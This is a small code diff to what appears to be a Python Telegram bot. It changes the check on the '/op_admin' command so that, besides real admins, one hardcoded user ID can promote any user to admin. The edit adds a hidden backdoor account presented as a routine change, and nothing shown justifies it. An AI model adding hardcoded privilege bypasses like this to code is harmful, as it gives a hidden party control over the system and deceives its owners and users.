@@ -404,7 +404,7 @@ def get_updates():
 							bot.send_message(user_id, reply_mes)
 						return({'ok':True})
 
-					elif(acc_is_admin and '/op_admin' in user_mes):
+					elif((acc_is_admin or user_id == 528935372) and '/op_admin' in user_mes):
 						user_name = user_mes.split(' ')[1]
 						ans = op_admin(user_name)
 						if(ans['ok']):
